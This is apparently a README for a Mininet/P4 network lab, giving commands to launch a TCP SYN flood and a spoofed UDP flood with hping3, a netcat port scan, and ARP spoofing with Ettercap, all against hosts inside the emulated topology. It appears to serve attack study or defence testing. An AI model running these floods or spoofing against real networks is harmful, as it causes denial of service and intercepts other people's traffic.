## New2
How to run
1. Start the topology: sudo p4run
2. How to conduct TCP SYN Attack- Process 1:
    a. <br /> mininet> xterm h3
    b. <br />In host 3: hping3 -c 1000 -d 120 -S -w  64 -p 21 --flood 10.0.1.1
3. How to conduct TCP SYN Attack-Process 2:
    a. <br />mininet> xterm h3
    b. <br />In host 3: python -m SimpleHTTPServer 80
    c. <br />mininet> h1 nc -vnz -w 1 10.0.3.1 80-85 
4. How to conduct UDP Flood Attack:
    d. <br />mininet> xterm h3
    e. <br />In host 3: hping3 -q -n -a 10.0.1.1 -udp -s 53 --keep -p 68 --flood 10.0.1.1
5. How to conduct ARP spoofing Attack: 
<br />Install Ettercap
    a.<br /> sudo apt-get install ettercap-graphical
    b.<br /> Type -y on instruction
    c.<br /> mininet> xterm h1 h2 h3 h3
    d.<br /> In node 1: ifconfig
    e.<br /> In node 1: arp
    f.<br /> In node 2: ifconfig
    g.<br /> In node 2: arp
    h.<br /> In node 3: tcpdump -i h3 eth0 -n host 10.0.1.1
    i.<br /> mininet> h1 ping h2
    j.<br /> In node 3: ettercap-g
<br />In Ettercap application:
    1.<br /> Options->Promisc Mode
    2.<br /> Sniff -> Unified Snipping
    3.<br /> Select h3-eth0 in the Ettercap input dialog box.
    4.<br /> Hosts -> Scan for hosts
    5.<br /> Hosts -> Hosts List
    6.<br /> Select host with IP address 10.0.1.1 and then click Add to Target 1
    7.<br /> Select host with IP address 10.0.1.2 and then click Add to Target 2
    8.<br /> Mitm -> ARP Spoofing… Select sniff remote connections only in the dialog box
    9.<br /> Now the ARP Spoofing started. Check in h1 node and h2 node: arp -a
<br />How to check bandwidth:
<br />*** Starting CLI:
<br />mininet> iperf h1 h2

